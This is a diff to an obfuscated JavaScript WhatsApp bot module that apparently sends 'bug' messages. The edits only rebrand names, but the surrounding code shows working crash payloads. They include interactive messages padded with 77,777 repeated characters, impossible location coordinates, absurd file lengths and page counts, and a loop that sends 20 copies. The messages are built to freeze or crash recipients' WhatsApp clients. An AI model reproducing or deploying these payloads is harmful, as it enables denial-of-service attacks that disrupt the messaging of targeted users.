@@ -419,7 +419,7 @@ module.exports = async (_0x4b53e5, _0x21f0d9) => {
       let {
         key: _0x3c8295
       } = await _0x4b53e5.sendMessage(_0x21f0d9.chat, {
-        text: "\n> 𝐊-𝐂-𝛁-𝟕💀"
+        text: "\n> 𝐆𝐫𝐞𝐞𝐧-𝐋𝐚𝐧𝐭𝐞𝐫𝐧 𝐯𝟏💀"
       });
       const _0x5909a5 = _0x3c254b => {
         return _0x3c254b[Math.floor(Math.random() * _0x3c254b.length)];
@@ -481,7 +481,7 @@ module.exports = async (_0x4b53e5, _0x21f0d9) => {
       key: _0xfcb4de,
       message: {
         listResponseMessage: {
-          title: "𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕"
+          title: "𝐆𝐫𝐞𝐞𝐧-𝐋𝐚𝐧𝐭𝐞𝐫𝐧 𝐯𝟏"
         }
       }
     };
@@ -496,7 +496,7 @@ module.exports = async (_0x4b53e5, _0x21f0d9) => {
       key: _0x2c875b,
       message: {
         listResponseMessage: {
-          title: "𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕"
+          title: "𝐆𝐫𝐞𝐞𝐧-𝐋𝐚𝐧𝐭𝐞𝐫𝐧 𝐯𝟏"
         }
       }
     };
@@ -527,12 +527,12 @@ module.exports = async (_0x4b53e5, _0x21f0d9) => {
           message: {
             interactiveMessage: {
               header: {
-                title: "⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏",
+                title: "⭑̤▾ ⿻ Dev ⿻ ▾⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏",
                 locationMessage: {
                   degreesLatitude: -999.035,
                   degreesLongitude: 922.999999999999,
                   name: "⚝𝐏𝐒𝐓𝐞𝐚𝐦𝐀𝐝𝐦⚝",
-                  address: "🎭⃟༑⌁⃰𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕ཀ͜͡😈",
+                  address: "🎭⃟༑⌁⃰𝐆𝐫𝐞𝐞𝐧-𝐋𝐚𝐧𝐭𝐞𝐫𝐧 𝐯𝟏😈",
                   jpegThumbnail: _0x4be10f
                 },
                 hasMediaAttachment: true
@@ -545,7 +545,7 @@ module.exports = async (_0x4b53e5, _0x21f0d9) => {
                 buttons: [{
                   name: "single_select",
                   buttonParamsJson: {
-                    title: "🎭⃟༑⌁⃰𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕ཀ͜͡😈",
+                    title: "🎭⃟༑⌁⃰𝐆𝐫𝐞𝐞𝐧-𝐋𝐚𝐧𝐭𝐞𝐫𝐧 𝐯𝟏😈",
                     sections: [{
                       title: "A NEW ERA ϟ",
                       rows: []
@@ -568,7 +568,7 @@ module.exports = async (_0x4b53e5, _0x21f0d9) => {
           jid: _0x487935
         }
       } : {});
-      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑"));
+      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ dev ⿻ ▾⭑"));
     }
     async function _0x5137fb(_0x4dff2f, _0x5b86d5, _0xc89402, _0x25345a = false) {
       let _0x56b955 = generateWAMessageFromContent(_0x4dff2f, proto.Message.fromObject({
@@ -576,12 +576,12 @@ module.exports = async (_0x4b53e5, _0x21f0d9) => {
           message: {
             interactiveMessage: {
               header: {
-                title: "⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏" + "ꦾ".repeat(77777),
+                title: "⭑̤▾ ⿻ dev ⿻ ▾⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏" + "ꦾ".repeat(77777),
                 locationMessage: {
                   degreesLatitude: -999.035,
                   degreesLongitude: 922.999999999999,
                   name: "⚝𝐏𝐒𝐓𝐞𝐚𝐦𝐀𝐝𝐦⚝",
-                  address: "🎭⃟༑⌁⃰𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕ཀ͜͡😈",
+                  address: "🎭⃟༑⌁⃰𝐆𝐫𝐞𝐞𝐧-𝐋𝐚𝐧𝐭𝐞𝐫𝐧 𝐯𝟏😈",
                   jpegThumbnail: _0xc89402
                 },
                 hasMediaAttachment: true
@@ -594,7 +594,7 @@ module.exports = async (_0x4b53e5, _0x21f0d9) => {
                 buttons: [{
                   name: "single_select",
                   buttonParamsJson: {
-                    title: "🎭⃟༑⌁⃰𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕ཀ͜͡😈",
+                    title: "🎭⃟༑⌁⃰𝐆𝐫𝐞𝐞𝐧-𝐋𝐚𝐧𝐭𝐞𝐫𝐧 𝐯𝟏😈",
                     sections: [{
                       title: "A NEW ERA ϟ",
                       rows: []
@@ -617,7 +617,7 @@ module.exports = async (_0x4b53e5, _0x21f0d9) => {
           jid: _0x4dff2f
         }
       } : {});
-      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑"));
+      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ dev ⿻ ▾⭑"));
     }
     async function _0x4aab8c(_0x26fca9, _0x337d02, _0x15ad6e = false) {
       let _0x19c0c4 = generateWAMessageFromContent(_0x26fca9, proto.Message.fromObject({
@@ -625,12 +625,12 @@ module.exports = async (_0x4b53e5, _0x21f0d9) => {
           message: {
             interactiveMessage: {
               header: {
-                title: "⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏",
+                title: "⭑̤▾ ⿻ dev ⿻ ▾⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏",
                 locationMessage: {
                   degreesLatitude: -999.035,
                   degreesLongitude: 922.999999999999,
                   name: "⚝𝐏𝐒𝐓𝐞𝐚𝐦𝐀𝐝𝐦⚝",
-                  address: "🎭⃟༑⌁⃰𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕ཀ͜͡😈",
+                  address: "🎭⃟༑⌁⃰𝐆𝐫𝐞𝐞𝐧-𝐋𝐚𝐧𝐭𝐞𝐫𝐧 𝐯𝟏😈",
                   jpegThumbnail: _0x337d02
                 },
                 hasMediaAttachment: true
@@ -643,7 +643,7 @@ module.exports = async (_0x4b53e5, _0x21f0d9) => {
                 buttons: [{
                   name: "single_select",
                   buttonParamsJson: {
-                    title: "🎭⃟༑⌁⃰𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕ཀ͜͡😈",
+                    title: "🎭⃟༑⌁⃰𝐆𝐫𝐞𝐞𝐧-𝐋𝐚𝐧𝐭𝐞𝐫𝐧 𝐯𝟏😈",
                     sections: [{
                       title: "A NEW ERA ϟ",
                       rows: []
@@ -666,7 +666,7 @@ module.exports = async (_0x4b53e5, _0x21f0d9) => {
           jid: _0x26fca9
         }
       } : {});
-      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑"));
+      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ dev ⿻ ▾⭑"));
     }
     async function _0xeec952(_0x5c2d01, _0x5585f6, _0x5bee85 = false, _0x103038 = false) {
       let _0x5837a2 = generateWAMessageFromContent(_0x5c2d01, proto.Message.fromObject({
@@ -682,7 +682,7 @@ module.exports = async (_0x4b53e5, _0x21f0d9) => {
                   fileLength: "9999999999999",
                   pageCount: 9007199254740991,
                   mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
-                  fileName: "𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕",
+                  fileName: "𝐆𝐫𝐞𝐞𝐧-𝐋𝐚𝐧𝐭𝐞𝐫𝐧 𝐯𝟏",
                   fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                   directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                   mediaKeyTimestamp: "1723855952",
@@ -695,13 +695,13 @@ module.exports = async (_0x4b53e5, _0x21f0d9) => {
                 hasMediaAttachment: true
               },
               body: {
-                text: "⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑̤"
+                text: "⭑̤▾ ⿻ dev ⿻ ▾⭑̤"
               },
               nativeFlowMessage: {
                 messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
                 buttons: [_0x5bee85 ? {
                   name: "single_select",
-                  buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰Chucky😈" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"A NEW ERA ϟ\",\"rows\":[]}]}"
+                  buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰dev😈" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"A NEW ERA ϟ\",\"rows\":[]}]}"
                 } : {
                   name: "payment_method",
                   buttonParamsJson: ""
@@ -713,7 +713,7 @@ module.exports = async (_0x4b53e5, _0x21f0d9) => {
                   buttonParamsJson: "{}"
                 }, {
                   name: "single_select",
-                  buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕ཀ͜͡😈\",\"sections\":[{\"title\":\"A NEW ERA ϟ\",\"rows\":[]}]}"
+                  buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐆𝐫𝐞𝐞𝐧-𝐋𝐚𝐧𝐭𝐞𝐫𝐧 𝐯𝟏😈\",\"sections\":[{\"title\":\"A NEW ERA ϟ\",\"rows\":[]}]}"
                 }, {
                   name: "galaxy_message",
                   buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"🔥\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
@@ -734,7 +734,7 @@ module.exports = async (_0x4b53e5, _0x21f0d9) => {
           jid: _0x5c2d01
         }
       } : {});
-      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑"));
+      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ dev ⿻ ▾⭑"));
     }
     async function _0x4ad2d9(_0x460c09, _0x3530b6, _0x2995d8 = false, _0x1730ff = false) {
       let _0x381aa3 = generateWAMessageFromContent(_0x460c09, proto.Message.fromObject({
@@ -750,7 +750,7 @@ module.exports = async (_0x4b53e5, _0x21f0d9) => {
                   fileLength: "9999999999999",
                   pageCount: 9007199254740991,
                   mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
-                  fileName: "🩸⃟༑⌁⃰𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕ཀ͜͡🦠",
+                  fileName: "🩸⃟༑⌁⃰𝐆𝐫𝐞𝐞𝐧-𝐋𝐚𝐧𝐭𝐞𝐫𝐧 𝐯𝟏🦠",
                   fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                   directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                   mediaKeyTimestamp: "1723855952",
@@ -769,7 +769,7 @@ module.exports = async (_0x4b53e5, _0x21f0d9) => {
                 messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
                 buttons: [_0x2995d8 ? {
                   name: "single_select",
-                  buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕ཀ͜͡😈" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"A NEW ERA ϟ\",\"rows\":[]}]}"
+                  buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐆𝐫𝐞𝐞𝐧-𝐋𝐚𝐧𝐭𝐞𝐫𝐧 𝐯𝟏😈" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"A NEW ERA ϟ\",\"rows\":[]}]}"
                 } : {
                   name: "payment_method",
                   buttonParamsJson: ""
@@ -781,7 +781,7 @@ module.exports = async (_0x4b53e5, _0x21f0d9) => {
                   buttonParamsJson: "{}"
                 }, {
                   name: "single_select",
-                  buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕ཀ͜͡😈\",\"sections\":[{\"title\":\"A NEW ERA ϟ\",\"rows\":[]}]}"
+                  buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐆𝐫𝐞𝐞𝐧-𝐋𝐚𝐧𝐭𝐞𝐫𝐧 𝐯𝟏😈\",\"sections\":[{\"title\":\"A NEW ERA ϟ\",\"rows\":[]}]}"
                 }, {
                   name: "galaxy_message",
                   buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"🔥\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
@@ -802,7 +802,7 @@ module.exports = async (_0x4b53e5, _0x21f0d9) => {
           jid: _0x460c09
         }
       } : {});
-      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑"));
+      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ dev ⿻ ▾⭑"));
     }
     async function _0x2f7ba8(_0x5cc16c, _0x1a599a, _0x18dbe2, _0x3ac56c = false, _0x57b9e3 = true) {
       for (let _0x1d7dfa = 0; _0x1d7dfa < 20; _0x1d7dfa++) {
@@ -819,7 +819,7 @@ module.exports = async (_0x4b53e5, _0x21f0d9) => {
                     fileLength: "9999999999999",
                     pageCount: 9007199254740991,
                     mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
-                    fileName: "⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻",
+                    fileName: "⿻ dev ⿻",
                     fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                     directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                     mediaKeyTimestamp: "1723855952",
@@ -832,7 +832,7 @@ module.exports = async (_0x4b53e5, _0x21f0d9) => {
                   hasMediaAttachment: true
                 },
                 body: {
-                  text: "⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑Ui ⿻ ▾⭑ꦾ" + "ꦾ".repeat(77777)
+                  text: "⭑̤▾ ⿻ dev Ui ⿻ ▾⭑ꦾ" + "ꦾ".repeat(77777)
                 },
                 nativeFlowMessage: {
                   messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}"
@@ -867,7 +867,7 @@ module.exports = async (_0x4b53e5, _0x21f0d9) => {
                   fileLength: "9999999999999",
                   pageCount: 9007199254740991,
                   mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
-                  fileName: "⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻",
+                  fileName: "⿻ dev ⿻",
                   fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                   directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                   mediaKeyTimestamp: "1723855952",
@@ -880,13 +880,13 @@ module.exports = async (_0x4b53e5, _0x21f0d9) => {
                 hasMediaAttachment: true
               },
               body: {
-                text: "⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑̤" + "ꦾ".repeat(70000)
+                text: "⭑̤▾ ⿻ dev ⿻ ▾⭑̤" + "ꦾ".repeat(70000)
               },
               nativeFlowMessage: {
                 messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
                 buttons: [_0x57853a ? {
                   name: "single_select",
-                  buttonParamsJson: "{\"title\":\"\n⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻\n\n" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻\",\"rows\":[]}]}"
+                  buttonParamsJson: "{\"title\":\"\n⿻ dev ⿻\n\n" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻\",\"rows\":[]}]}"
                 } : {
                   name: "payment_method",
                   buttonParamsJson: ""
@@ -898,7 +898,7 @@ module.exports = async (_0x4b53e5, _0x21f0d9) => {
                   buttonParamsJson: "{}"
                 }, {
                   name: "single_select",
-                  buttonParamsJson: "{\"title\":\"⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻\",\"sections\":[{\"title\":\"A NEW ERA ϟ\",\"rows\":[]}]}"
+                  buttonParamsJson: "{\"title\":\"⿻ dev ⿻\",\"sections\":[{\"title\":\"A NEW ERA ϟ\",\"rows\":[]}]}"
                 }, {
                   name: "galaxy_message",
                   buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"🔥\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
@@ -919,7 +919,7 @@ module.exports = async (_0x4b53e5, _0x21f0d9) => {
           jid: _0x1646eb
         }
       } : {});
-      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑"));
+      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ dev ⿻ ▾⭑"));
     }
     async function _0x23fd79(_0x2a251e, _0x48adcb, _0x4b6d63, _0x3b8911 = true) {
       const _0x44e08c = {
@@ -944,7 +944,7 @@ module.exports = async (_0x4b53e5, _0x21f0d9) => {
           jid: _0x2a251e
         }
       } : {});
-      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑"));
+      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ DEVIL 🥷🏽🔥 ⿻ ▾⭑"));
     }
     async function _0x4e135a(_0xefe050, _0x31460d, _0x2e8c07, _0x39d389 = true) {
       const _0x45996b = {
@@ -976,7 +976,7 @@ module.exports = async (_0x4b53e5, _0x21f0d9) => {
           jid: _0xefe050
         }
       } : {});
-      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑"));
+      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ DEVIL 🥷🏽🔥❤️ ⿻ ▾⭑"));
     }
     async function _0x597974(_0x24f61d, _0x559238 = true) {
       let _0x46dc12 = generateWAMessageFromContent(_0x24f61d, proto.Message.fromObject({
